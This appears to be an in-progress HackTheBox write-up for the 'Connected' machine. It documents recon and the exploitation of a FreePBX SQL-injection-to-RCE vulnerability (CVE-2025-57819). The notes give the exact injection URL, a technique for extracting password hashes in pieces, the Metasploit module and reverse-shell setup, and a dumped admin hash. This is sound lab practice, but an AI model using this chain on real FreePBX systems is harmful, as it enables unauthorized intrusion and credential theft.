# Connected (Easy) — HackTheBox

- **Target IP:** 10.129.136.83
- **Started:** 2026-10-28
- **Status:** In progress

## Timeline / Steps

### 1. Recon

**nmap -sV 10.129.136.83**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 7.4 (protocol 2.0) |
| 80/tcp | open | http | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16) |
| 443/tcp | open | ssl/http | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16) |

Notes: CentOS host, Apache 2.4.6, PHP 7.4.16, OpenSSH 7.4. HTTP + HTTPS both open.

### 2. Web Enumeration
- Website runs **FreePBX 16.0.40.7**.
- Candidate vuln: **CVE-2025-57819** — unauthenticated SQL injection leading to RCE via the `brand` parameter at `/admin/ajax.php`.
- PoC ref: github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819
- Confirmed error-based SQLi via `EXTRACTVALUE` on `brand` param — leaks `USER()`.
- Injection point: `/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<INJECT>`

### 3. Credential extraction (Stage 1)
- Plan: dump `ampusers` (username, password_sha1) from `asterisk` DB via error-based SQLi.
- Note: `EXTRACTVALUE` truncates at 32 chars; SHA1 is 40 hex — split with `SUBSTRING(password_sha1,1,31)` + `SUBSTRING(password_sha1,31,10)`.
- Then crack SHA1 (hashcat -m 100) and log in at /admin/.
- Stage 2 (authenticated RCE → reverse shell): pending.
- Approach switched: using the **Metasploit module for CVE-2025-57819** to get a shell.
- Module: `exploit(unix/http/freepbx_unauth_sqli_to_rce)`, LHOST 10.10.14.76:4444.
- Run 1: created cronjob 'puhyS', waited, cleaned up — **no session created**.
  - Root cause: **local firewall was blocking incoming connections** on 4444, so the target's reverse callback never reached the handler.
  - Fix: allowed inbound on port 4444 from tun0 → **exploit succeeded, shell obtained**.

## Credentials / Loot
- FreePBX admin: `admin` : SHA1 `05c689686a4fad5ce3ec76e7ae5708b1fe2da43a` (needs cracking)

### 4. Foothold
- Landed as user **asterisk** — `uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)`.
- **User flag:** `/home/asterisk/user.txt` ✅

### 5. Privilege Escalation
- (in progress)

## Flags
- user: captured (/home/asterisk/user.txt)
- root:

## Notes
